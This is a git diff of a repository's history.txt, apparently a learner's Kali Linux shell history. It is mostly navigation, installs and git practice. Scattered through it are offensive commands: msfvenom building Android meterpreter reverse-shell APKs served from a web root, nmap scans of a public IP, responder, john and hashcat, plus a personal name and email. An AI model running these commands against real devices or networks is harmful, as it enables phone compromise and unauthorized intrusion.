@@ -1,49 +1,918 @@
-    1  git config user.name
-    2  mkdir git-basic-exersices
-    3  mv git-basic-exersices git-basic-exercises
-    4  ls
-    5  cd git-basic-exercises
-    6  ls -a
-    7  git init
-    8  ls -a
-    9  git status
-   10  touch README.md
-   11  ls -a
-   12  git lo
-   13  git log
-   14  git add README.md
-   15  git status
-   16  git rm --cached README.md
-   17  git status
-   18  git add README.md
-   19  git commit -m "initial commit"
-   20  git log
-   21  nano README.md
-   22  cat README.md
-   23  git status
-   24  git add README.md
-   25  git commit -m "second commit"
-   26  nano README.md
-   27  git status
-   28  git add README.md
-   29  git commit -m "third commit"
-   30  git log
-   31  git checkout 18c06581819a00e0ea3ab6d9846a5008ed1cda87
-   32  cat README.md
-   33  git checkout main
-   34  cat README.md
-   35  git branch
-   36  git branch milkshake-flavours
-   37  git checkout milkshake-flavours
-   38  nano milkshakes.md
-   39  git status
-   40  git add milkshakes.md
-   41  git commit -m "added initial flavours"
-   42  git log
-   43  git checkout main
-   44  git lo
-   45  git log
-   46  git branch history
-   47  git branch
-   48  git checkout history
-   49  history > history.txt
+    1  help
+    2  tools
+    3  sudo tools
+    4  wireshark
+    5  ls
+    6  cd
+    7  sudo apt-get update
+    8  sudo apt-get -y install wireshark
+    9  sudo apt -y install wireshark
+   10  sudo apt-get remove wireshark
+   11  sudo apt install libwireshark
+   12  sudo apt install libwireshark-data
+   13  --colour
+   14  sudo colour
+   15  cd downloads
+   16  apt-get install git
+   17  y
+   18  alias ls ='ls --color=always -rthla'
+   19  sudo apt update
+   20  sudo apt install -y kali-win-kex
+   21  exit
+   22  sudo apt dist-upgrade
+   23  sudo apt -y kali-win-kex
+   24  sudo apt update
+   25  sudo apt install -y kali-win-kex
+   26  print(1)
+   27  exit
+   28  sudo kali-win-kex exti
+   29  kex --win -s
+   30  kex --esn --ip -s
+   31  ext
+   32  exit
+   33  sudo kex --esm --ip -s
+   34  kex --esm --ip -s
+   35  kex --esm -s
+   36  exit
+   37  kex --esm -s
+   38  kex --ip is
+   39  kex --esm -s
+   40  sudo task-manager start
+   41  sudo network-manager start
+   42  sudo network manager start
+   43  search network
+   44  sudo NetworkManager start
+   45  sudo help
+   46  help
+   47  sudo NetworkManager enable
+   48  kex --ip
+   49  kex --ip -s
+   50  ip
+   51  kex help
+   52  wsl help
+   53  kex --kill
+   54  kex 
+   55  kex help
+   56  kex --win
+   57  kex --sl
+   58  sudo ask for password
+   59  root hel[
+   60  root help
+   61  help
+   62  kex help
+   63  kex --sl -s
+   64  exit
+   65  sudo apt install aircrack-ng
+   66  kex help
+   67  kex --sl -s
+   68  cd /root
+   69  sudo cd /root
+   70  sudo /root
+   71  ccd $HOME
+   72  cd $HOME
+   73  ls
+   74  mv /mnt/c/users/CASH/Desktop/Mr_Robot_Season_01 .
+   75  cd home
+   76  cd$home
+   77  ls
+   78  cd /Mr_Robot_Season_01
+   79  cd /downloads
+   80  cd $home
+   81  cd $HOME
+   82  ls
+   83  cd Mr_Robot_Season_01/
+   84  ls
+   85  cd [200~Mr._Robot_-_S01E01_-_eps1.0_hellofriend.mov_76137e006f6dfbbf303e5bbe62b925a7.mp4 cd 
+   86  cd Mr._Robot_-_S01E01_-_eps1.0_hellofriend.mov_76137e006f6dfbbf303e5bbe62b925a7.mp4
+   87  cd /Mr._Robot_-_S01E01_-_eps1.0_hellofriend.mov_76137e006f6dfbbf303e5bbe62b925a7.mp4
+   88  kex -s -i
+   89  kex help
+   90  kex --sl -s
+   91  mv /mnt/c/users/Public.LAPTOP-7PS8H55H/Desktop/movies/
+   92  bash: cd: too many arguments
+   93  ┌──(douglas㉿HUAWEI-MATEBOOK-D15)-[~/Mr_Robot_Season_01]
+   94  mv /mnt/c/users/Public.LAPTOP-7PS8H55H/Desktop/movies/The_Great_Hack_(2019)
+   95  mv /mnt/c/users/Public.LAPTOP-7PS8H55H/Desktop/movies/The_Great_Hack .
+   96  cd /Desktop
+   97  cd /This PC
+   98  cd /mnt
+   99  ls
+  100  cd c/Users/CASH/home
+  101  cd c/Users/CASH/
+  102  ls
+  103  cd c/Users/Public.LAPTOP-7PS8H55H/Desktop
+  104  cd mnt'
+  105  cd /mnt
+  106  sudo /root
+  107  /root help
+  108  root help
+  109  sudo help
+  110  help
+  111  root
+  112  cd rooy
+  113  cd root
+  114  clear
+  115  cd root
+  116  /root
+  117  bash root
+  118  su -douglas
+  119  su--help
+  120  su -help
+  121  /etc/ssh/sshd_config:
+  122  cd /root/
+  123  sudo cd /rroot/
+  124  clear
+  125  sudo -s /root/
+  126  sudo -s root
+  127  cd -
+  128  cd //
+  129  cd -
+  130  cd /
+  131  dir root
+  132  sudo dir root
+  133  cd
+  134  ls
+  135  sudo dir root
+  136  su dougla
+  137  su douglas
+  138  ls
+  139  wsl kex --esm s
+  140  wsl kex --esm -s
+  141  wsl kex --esm -l
+  142  kex --esm -l
+  143  clear
+  144  kex --esm -i
+  145  kex
+  146  kex --sl -i
+  147  su kali
+  148  su douglas
+  149  kex -sl -i
+  150  python
+  151  pkg install python
+  152  install python
+  153  sudo python
+  154  sudo -fkill
+  155  sudo -u kill
+  156  sudo -ukill
+  157  sudo -udouglas
+  158  sudo -u douglas
+  159  clear
+  160  sudo -s kill
+  161  sudo kill -
+  162  sudo kill
+  163  sudo kill -h
+  164  sudo kill -v
+  165  kex --esm -s 
+  166  sudo kill
+  167  sudo exit
+  168  exit
+  169  sudo su
+  170  clear
+  171  cd \mnt\
+  172  cd /mnt/
+  173  ls
+  174  cd c/Users/CASH
+  175  ls
+  176  cd Documents
+  177  ls
+  178  cd /Cisco docs
+  179  cd /Cisco docs/
+  180  cd -
+  181  dpkg maltego
+  182  sudo apt
+  183  sudo apt autoremove -purge
+  184  sudo apt -purge
+  185  clear
+  186  NetworkManager enable
+  187  start NetworkManager
+  188  run  NetworkManager
+  189  sudo  NetworkManager
+  190  sudo apt-get update
+  191  sudovapt-get -y install nmap
+  192  sudo apt-get -y install nmap
+  193  sudo apt update
+  194  sudo apt -y install nmap
+  195  nmap
+  196  cd c/Users/CASH
+  197  cd /mnt/c/Users/CASH
+  198  cd movies
+  199  cd /movies
+  200  ls
+  201  cd  Security+.txt .
+  202  kex -sl i
+  203  cd
+  204  exit
+  205  sudo msfdb init
+  206  sudo apt install metasploit-framework
+  207  sudo apt install sherlock
+  208  exit
+  209  wsl --terminate kali-linux
+  210  kex --terminate kali-linuc
+  211  wsl -t
+  212  kex -t
+  213  kex -h
+  214  kex --esm --stop
+  215  kex --esm -i
+  216  kex help
+  217  exit
+  218  cd #HOME
+  219  ls
+  220  cd downloads
+  221  cd /downloads
+  222  cd \downloads
+  223  cd /Downloads
+  224  cd /Desktop
+  225  la
+  226  ld
+  227  clear
+  228  cd /Downloads/
+  229  ls
+  230  cd \Public
+  231  cd =
+  232  cd -
+  233  cd \Downloads
+  234  ls
+  235  help mv
+  236  mv
+  237  mv -h
+  238  mv --help
+  239  copy --help
+  240  cp --help
+  241  ls 
+  242  cp  Mr._Robot_-_S01E08_-_eps1.7_wh1ter0se.m4v_25ee5dfcbe88ea252ccaa479ccfa5d6b.mp4 \mnt\c\Users\CASH\Desktop
+  243  ls
+  244  cp  Mr._Robot_-_S01E08_-_eps1.7_wh1ter0se.m4v_25ee5dfcbe88ea252ccaa479ccfa5d6b.mp4 \mnt\c\Users\CASH\Desktop
+  245  cd \mnt\c\Users\CASH\Desktop
+  246  ls
+  247  cd \mnt\
+  248  cd /mnt/
+  249  cd \home\douglas\Downloads>
+  250  cd #HOME
+  251  cd \Downloads
+  252  ls
+  253  cp Mr._Robot_-_S01E08_-_eps1.7_wh1ter0se.m4v_25ee5dfcbe88ea252ccaa479ccfa5d6b.mp4 /mnt/c/Users/CASH/Desktop/
+  254  cd #home
+  255  cd /mnt/c/Users/CASH/Desktop
+  256  cp \c\home\douglas\Downloads  Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4 
+  257  cp  Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4 
+  258  cp  Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4 \c\home\douglas\Downloads
+  259  cd \home\douglas
+  260  cp  Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4 #home\douglas\Downloads
+  261  cd #home
+  262  cd downloas
+  263  cd downloads
+  264  cd \downloads
+  265  cd Downloads
+  266  ls
+  267  cp Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4 /mnt/Users/CASH/Desktop
+  268  cp Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4 /mnt/c/Users/CASH/Desktop
+  269  cp  Mr._Robot_-_S01E10_-_eps1.9_zer0-day_71d11baee22c2d4dd402e969bc0c3fa5.mp4 /mnt/c/Users/CASH/Desktop
+  270  exit
+  271  ~/
+  272  touch ~/.hushlogin
+  273  wsl -t
+  274  termianate
+  275  terminate
+  276  --help
+  277  help
+  278  logout
+  279  cd \Downloads
+  280  ls
+  281  clear
+  282  cd $HOME
+  283  cd \Downloads
+  284  ls
+  285  mv Mr._Robot_-_S01E08_-_eps1.7_wh1ter0se.m4v_25ee5dfcbe88ea252ccaa479ccfa5d6b.mp4 \home\douglas\Mr_Robot_Season_01
+  286  ls
+  287  mv  Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4
+  288  mv --help
+  289  clear
+  290  mv help
+  291  mv --help
+  292  ls
+  293  mv [Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4]
+  294  mv "Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4" , "Mr._Robot_-_S01E10_-_eps1.9_zer0-day_71d11baee22c2d4dd402e969bc0c3fa5.mp4" \home\douglas\Mr_Robot_Season_01
+  295  mv "Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4" , "Mr._Robot_-_S01E10_-_eps1.9_zer0-day_71d11baee22c2d4dd402e969bc0c3fa5.mp4"  \home\douglas\Mr_Robot_Season_01 .
+  296  ls
+  297  cd  \home\douglas\Mr_Robot_Season_01
+  298  cd home
+  299  cd #home
+  300  ls
+  301  cd Mr_Robot_Season_01
+  302  ls
+  303  mv Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4 
+  304  mv Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4  \home\douglas\Mr_Robot_Season_01
+  305  cd -
+  306  cd \Downloads
+  307  ls
+  308  mv Mr._Robot_-_S01E09_-_eps1.8_m1rr0r1ng.qt_80ca2ffa9e2e6dd2d15f473455e56dfc.mp4 \home\douglas\Mr_Robot_Season_01
+  309  mv Mr._Robot_-_S01E10_-_eps1.9_zer0-day_71d11baee22c2d4dd402e969bc0c3fa5.mp4 \home\dougla
+  310  s\Mr_Robot_Season_01
+  311  mv Mr._Robot_-_S01E10_-_eps1.9_zer0-day_71d11baee22c2d4dd402e969bc0c3fa5.mp4 \home\douglas\Mr_Robot_Season_01
+  312  ls
+  313  cd-
+  314  cd -
+  315  cd Mr_Robot_Season_01
+  316  ls
+  317  cd -
+  318  cd Downloads
+  319  ls
+  320  ls -
+  321  ls ~
+  322  ls `
+  323  ls /
+  324  ls ?
+  325  ls \
+  326  exit
+  327  /mnt/
+  328  \mnt
+  329  cd \mnt
+  330  cd /mnt
+  331  ls
+  332  cd wslg
+  333  ls
+  334  cd dumpss
+  335  cd dumps
+  336  cd
+  337  ls
+  338  cd dumps
+  339  cd mnt
+  340  cd /mnt
+  341  cd wslg
+  342  cd dumps
+  343  ls
+  344  dir
+  345  la
+  346  cd
+  347  cd /mnt
+  348  usbip
+  349  cd
+  350  usbip
+  351  isusb
+  352  hascat
+  353  hashcat --help
+  354  help hashcat
+  355  shutdown
+  356  logout
+  357  kex --esm -s
+  358  sudo
+  359  sudo apt install metasploit-framework
+  360  metasploit-framework help
+  361  help metasploit-framework
+  362  msfconsole
+  363  sudo apt install hashcat
+  364  hashcat
+  365  hashcat --help
+  366  clear
+  367  hashcat -h
+  368  sudo apt install netcat
+  369  sudo apt install netcat-traditional
+  370  netcta 
+  371  netcat
+  372  netcat -h
+  373  sudo apt install nmap
+  374  exiftool
+  375  sudo apt install libimage-exiftool-perl
+  376  clear
+  377  route
+  378  NetworkManager
+  379  sudo NetworkManager
+  380  sudo start NetworkManager
+  381  route
+  382  ifconfig
+  383  ipconfig
+  384  nmap -PR -sn 172.255..240.1
+  385  nmap -PR -sn 172.27.244.207
+  386  nmap kill
+  387  nmap -PR -sn 172.0.0.1/255
+  388  nmap -PR -sn 172.27.244.207
+  389  clear
+  390  nmap -PR -sn 172.27.244.207
+  391  nano iplist.txt
+  392  sudo nmap -PE -sn scanne.nmap.org 
+  393  sudo nmap -PA80 -sn scanne.nmap.org 
+  394  logout
+  395  exit
+  396  logout
+  397  sudo logout
+  398  cleear
+  399  clear
+  400  namp 127.27.244.207
+  401  sudo nmap
+  402  sudo nmap 172.27.244.207
+  403  clear
+  404  sudo nmap 172.27.244.207
+  405  ls
+  406  nmap -p 22 -il
+  407  reset
+  408  sudo nmap 172.27.244.207
+  409  sudo nmap -sA -iL [200~172.27.244.207
+  410  sudo nmap -sA -iL 172.27.244.207
+  411  sudo nmap -p 172.27.244.207
+  412  sudo nmap 172.27.244.207
+  413  nmap 41.150.255.90
+  414  sudo nmap -Pn 41.150.255.90
+  415  nano iplist.txt
+  416  ls
+  417  nmap -p 22 -il iplist.txt
+  418  sudo nmap -sA -iL iplist.txt
+  419  nmap -p80 iL iplist.txt
+  420  clear
+  421  kex logout
+  422  kex exit
+  423  kex kill session
+  424  kex --esm -i
+  425  ifconfig
+  426  clear
+  427  exit
+  428  ifconfig
+  429  msfvenom -h
+  430  msfvenom -p android/meterpreter/reverse_tcp LHOST=172.27.244.207 LPORT=4444 R> /var/www/androidhack.apk/
+  431  msfvenom -p android/meterpreter/reverse_tcp LHOST=172.27.244.207 LPORT=4444 R> 
+  432  msfvenom -p android/meterpreter/reverse_tcp LHOST=172.27.244.207 LPORT=4444 R> /var/www/androidhack/html.apk/
+  433  kex --esm -i
+  434  $ sudo nmap -sA -iL iplist.txt
+  435  netcat help
+  436  netcat -h
+  437  clear
+  438  sudo netcat -h
+  439  john
+  440  hashcat
+  441  netcat
+  442  clewaf
+  443  clear
+  444  hashcat -h
+  445  nano iplist.txt
+  446  nmap -PR -sn 172.27.244.207
+  447  sudo nmap 41.150.255.90
+  448  sudo su
+  449  apache2 status
+  450  service apache2 status
+  451  systemctl status apache2
+  452  sudo service ssh restart
+  453  wsl --version
+  454  init.d
+  455  msvenom -h
+  456  ifconfig
+  457  msfvenom -h
+  458  msfvenom -p android/meterpreter/reverse_tcp LHOST=172.27.244.207 LPORT=4444 R> /var/www/androidhack.apk/
+  459  msfvenom -p android/meterpreter/reverse_tcp LHOST=172.27.244.207 LPORT=4444 R> androidhack.apk
+  460  service apache2 start
+  461  sudo apt-get install apache2
+  462  service apache2 start
+  463  sudo service apache2 start
+  464  sudo systemctl status apache2
+  465  sudo apache2 status
+  466  sudo su
+  467  client
+  468  kex -esm -s
+  469  kex -esm -i
+  470  kex --esm -i
+  471  sudo apt upgrade
+  472  sudo apt install tor-browser
+  473  sudo install install tor browser
+  474  sudo install -y tor browser-launcher
+  475  tor browser-launcher
+  476  torbrowser-launcher
+  477  sudo su
+  478  iwfconfig
+  479  iwconfig
+  480  sudo apt install tor-browser
+  481  sudo pkg install tor-browser
+  482  sudo apt install tor browser
+  483  cd /var/
+  484  cd /lib/
+  485  cd dpkg
+  486  cd /lock-frontend
+  487  ls
+  488  cd methods
+  489  ls
+  490  cd apt
+  491  cd
+  492  ls
+  493  cd lib/dpkg/methods/apt
+  494  cd /var/lib/dpkg
+  495  ls
+  496  cd lock-frontend
+  497  dir
+  498  dir lock-frontend
+  499  isusb -vv
+  500  airmon-ng
+  501  sudo apt install airmon-ng
+  502  ipna
+  503  ip a
+  504  airmon-ng start eth0
+  505  airmon-ng
+  506  sudo install aircrack-ng
+  507  sudo apt install airmon-ng
+  508  sudo apt install Airmon-ng
+  509  sudo apt install aircrack-ng
+  510  cd
+  511  sudo apt install aircrack-ng
+  512  iwconfig
+  513  kex --esm -i
+  514  sudo pip3 install requirements
+  515  sudo install python
+  516  sudo apt install  python
+  517  sudo apt install  python3
+  518  python
+  519  python3
+  520  sudo apt install pip
+  521  attack,com
+  522  attack.com
+  523  selector._domainkey.attacker.com TXT
+  524  config.py
+  525  sudo pip3 install -r requirements.txt
+  526  [200~selector._domainkey.attacker.com TXT  “v=DKIM1; k=rsa; t=y; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNjwdrmp/gcbKLaGQfRZk+LJ6XOWuQXkAOa/lI1En4t4sLuWiKiL6hACqMrsKQ8XfgqN76mmx4CHWn2VqVewFh7QTvshGLywWwrAJZdQ4KTlfR/2EwAlrItndijOfr2tpZRgP0nTY6saktkhQdwrk3U0SZmG7U8L9IPj7ZwPKGvQIDAQAB”~
+  527  cd
+  528  cd /mnt/c/Users/CASH
+  529  ls
+  530  cd Desktop
+  531  ls
+  532  cp Douglas Simana[1].pdf c\douglas\Desktop
+  533  cd
+  534  cd Desktop
+  535  cp /mnt/c/Users/CASH/Desktop Douglas Simana[1].pdf .
+  536  kex --esm -s
+  537  sudo 
+  538  ip addr
+  539  msfpatload
+  540  msf console
+  541  exit
+  542  msfconsole  android/meterpreter/reverse_tcp LHOST=127.27.244.207 R>/root/tester.apk
+  543  sudo su
+  544  sudo msfconsole  android/meterpreter/reverse_tcp LHOST=127.27.244.207 R>/root/tester.apk
+  545  sudo su
+  546  sudo msfconsole  android/meterpreter/reverse_tcp LHOST=127.27.244.207 R>/root/tester.apk
+  547  msfconsole  android/meterpreter/reverse_tcp LHOST=127.27.244.207 R>/root/tester.apk
+  548  sudo su
+  549  sudo msf console
+  550  msfconsole
+  551  sudo su
+  552  msfpayload  android/meterpreter/reverse_tcp LHOST=127.27.244.207 R>/root/tester.apk
+  553  sudo su
+  554  msfvenom -p android/meterpreter/reverse_tcp LHOST=127.27.244.207 LPORT=4444 R > /var/www/html/SteezyTest.apk
+  555  sudo su
+  556  l
+  557  ls
+  558  androidhack.apk
+  559  cd computer
+  560  cd lib
+  561  show evasion
+  562  cd
+  563  cd /mnt
+  564  cd
+  565  cd /mnt
+  566  l
+  567  cd wsl
+  568  l
+  569  ls
+  570  dc -
+  571  cd -
+  572  cd wslg
+  573  l
+  574  cd distro
+  575  l
+  576  cd root
+  577  cd etc
+  578  l
+  579  cd apache2
+  580  l
+  581  cd sites-enabled
+  582  l
+  583  cd ---
+  584  cd --
+  585  cd -
+  586  cd /mnt/wslg/distro
+  587  l
+  588  cd etc
+  589  ls
+  590  cd passwd
+  591  ls passwd
+  592  show
+  593  service apache2
+  594  service apache2 start
+  595  chmod -h
+  596  chmod --help
+  597  chmod --silent
+  598  use msfmultihandler
+  599  msfconsole
+  600  quit
+  601  exit
+  602  basj logout
+  603  bash logout
+  604  sudo logout
+  605  sudo kill kex
+  606  sudo kill wsl
+  607  sudo stop wsl
+  608  sudo exit kex
+  609  sudo stop kex
+  610  sudo stop
+  611  exit kex
+  612  wsl kill
+  613  logout
+  614  os.logout
+  615  shutdown
+  616  PID
+  617  cd /mnt
+  618  l
+  619  cd wslg
+  620  l
+  621  cd distro
+  622  l
+  623  cd boot
+  624  l
+  625  cd grub
+  626  l
+  627  cd themes
+  628  l
+  629  cd kali
+  630  l
+  631  logout
+  632  bash
+  633  cd -
+  634  cd
+  635  bash
+  636  kill kex
+  637  kex kill
+  638  sh
+  639  ifconfig
+  640  nmap
+  641  kex help
+  642  sudo kex
+  643  logout
+  644  exit
+  645  kex --esm -s
+  646  exit
+  647  aircrack-ng -a
+  648  aircrack-ng -a 2
+  649  airmon-ng
+  650  ip addr
+  651  cls
+  652  clear
+  653  iwconfig
+  654  eht0
+  655  net
+  656  networkmanager
+  657  start NETWORKMANGER
+  658  NETWORKMANGER
+  659  iwconfig
+  660  sudo su
+  661  node
+  662  python
+  663  sudo python
+  664  kex kill
+  665  cd mnt
+  666  l
+  667  cd /mnt
+  668  ls
+  669  cd c
+  670  ls
+  671  cat DumpStack.log.tmp
+  672  sudo cat DumpStack.log.tmp
+  673  cd -
+  674  clear
+  675  ls
+  676  cd /c/Users/CASH
+  677  kex kill
+  678  kex client
+  679  sudo pkg update 
+  680  sudo update
+  681  john /tmp/hashes
+  682  cd usr
+  683  sudo responder
+  684  sudo responder -I eth0
+  685  ping 192.168.0.1 -c 1
+  686  ping help
+  687  ping 192.168.0.1 
+  688  ping -h
+  689  clear
+  690  ping 192.168.0.1
+  691  setuid
+  692  sudo setuid
+  693  sudo cap_net_raw+p
+  694  nmap
+  695  clear
+  696  nmap
+  697  nmap -O
+  698  clear
+  699  sudo su
+  700  mousepad ipsweep.sh
+  701  cat new.txt | cut -d " " -f 4 | tr -d ":"
+  702  mousepad ipsweep.sh
+  703  chmod +x ipsweep.sh
+  704  ls
+  705  ls la
+  706  ls -la
+  707  clear
+  708  ./ipsweep.sh
+  709  ./ipsweep.sh 192.168.0.1
+  710  mousepad ipsweep.sh
+  711  ./ipsweep.sh
+  712  ip a
+  713  iwfconfig
+  714  iwconfig
+  715  clear
+  716  iwconmfig
+  717  iwconfig
+  718  sudo su
+  719  kex
+  720  kex kill
+  721  ls /usr/share/wordlists
+  722  ls \usr\share\wordlists
+  723  cd
+  724  ls usr/
+  725  cd usrls
+  726  ls usr\
+  727  hydra
+  728  joh
+  729  john
+  730  john /tmp/hashes 
+  731  kex -i
+  732  kex kill
+  733  win32 kill
+  734  win32
+  735  win]
+  736  win
+  737  exit
+  738  ls
+  739  help
+  740  sudo su
+  741  kex --esm -s
+  742  kex -esm -ip
+  743  kex --esm -i
+  744  iwconfig
+  745  exit
+  746  sudo su
+  747  kex --esm -i
+  748  exit
+  749  git --version
+  750  exit
+  751  clear
+  752  git config --list --show-origin
+  753  ls
+  754  clear
+  755  sudo su
+  756  git branch
+  757  git config --list
+  758  git config --list --show-origin
+  759  git config --global user.name "Douglas Aphane"
+  760  git config username
+  761  git username
+  762  git config user.name
+  763  git config user.email
+  764  git config --global user.email messykruger17@gmail.com
+  765  cd Desktop
+  766  ls
+  767  cd 'Everything Umuzi'
+  768  ls
+  769  cd git-basic-exercises
+  770  ls
+  771  cat history.txt
+  772  cat README.md
+  773  git log
+  774  git checkout c99bf9dc4a6578a5ad69f3d0bb2b221ef4953f53
+  775  cat README.md
+  776  git checkout main
+  777  cat README.mc
+  778  cat README.md
+  779  git status
+  780  git add history.txt
+  781  git  status
+  782  git commit -m "added history"
+  783  git log
+  784  git rm --cached history.txt
+  785  git status
+  786  git log
+  787  git branch
+  788  git branch history
+  789  git branch
+  790  git branch milkshake-flavours
+  791  ls -a
+  792  nano README.md
+  793  git status
+  794  git branch main
+  795  git branch
+  796  git commit -m "random readme changes"
+  797  git log
+  798  git drop
+  799  git --help
+  800  git d
+  801  git remove commit
+  802  git rm e5560da5a3b54ea55490ea43e42ac89c917f6235
+  803  git rm commit e5560da5a3b54ea55490ea43e42ac89c917f6235
+  804  rebase -i
+  805  drop
+  806  git status
+  807  git add README.md
+  808  git commmit -m "random readme changes"
+  809  git commit -m "random readme changes"
+  810  git log
+  811  re README.md
+  812  rm README.md
+  813  echo "booya" > README.md
+  814  git status
+  815  git add README.md
+  816  git status
+  817  git commit -m "rewrote readme"
+  818  git checkout main
+  819  ls
+  820  rm history.txt
+  821  ls
+  822  git lo
+  823  git log
+  824  git checkout milkshake-flavours
+  825  ls
+  826  git log
+  827  git checkout history
+  828  ls
+  829  git branch
+  830  ls
+  831  sudo su
+  832  cd Desktop
+  833  cd 'Everything Umuzi'
+  834  cd n
+  835  cd 2
+  836  cd git-basic-exercises
+  837  ls
+  838  cd a-repo-to-clone 
+  839  cd ../../
+  840  cd -
+  841  sl /
+  842  ls /
+  843  ls
+  844  ls root
+  845  ls \root
+  846  ls /root
+  847  sudo ls /root
+  848  cd /
+  849  ls
+  850  cd -
+  851  ls /
+  852  man ls
+  853  ls
+  854  ecit
+  855  exit
+  856  cd Desktop
+  857  ls
+  858  cd  'Everything Umuzi'
+  859  ls
+  860  cd  'level 1 coding challanges'
+  861  ls
+  862  git init
+  863  git branch
+  864  ls -a
+  865  git status
+  866  git branch main
+  867  su
+  868  sudo su
+  869  ssh -vT git@github.com
+  870  ssh-add /home/douglas/.ssh/id_rsa
+  871  sudo git clone git@github.com:Umuzi-org/Douglas-Aphane-219-level-1-programming-katas-javascript.git
+  872  git clonehttps://github.com/SteezyD21/git-basic-exercises
+  873  git clone https://github.com/SteezyD21/git-basic-exercises
+  874  git clone https://github.com/Umuzi-org/Douglas-Aphane-219-level-1-programming-katas-javascript
+  875  ls
+  876  git status
+  877  git log
+  878  git reset --hard HEAD^
+  879  git reset --hard HEAD
+  880  git log
+  881  git  reset
+  882  git log
+  883  git rebase -i HEAD
+  884  git reset --hard HEAD~1
+  885  git status
+  886  rm Douglas-Aphane-219-level-1-programming-katas-javascript/
+  887  git rm Douglas-Aphane-219-level-1-programming-katas-javascript/
+  888  cd
+  889  ls
+  890  cd home
+  891  cd $home
+  892  ls
+  893  cd home
+  894  kex
+  895  ls
+  896  ls -a
+  897  npm install monaco-editor@0.44.0
+  898  kex help
+  899  cd Desktop
+  900  cat history
+  901  cd 'Everything Umuzi'
+  902  ls
+  903  kex esm
+  904  cd Desktop
+  905  ls
+  906  cd 'Everything Umuzi'
+  907  ls
+  908  cd  git-basic-exercises
+  909  ls
+  910  git branch
+  911  git status
+  912  git checkout history
+  913  git status
+  914  cat ignore-me.db
+  915  nano ignore-me.db
+  916  ls
+  917  cat history.txt
+  918  history > history.txt
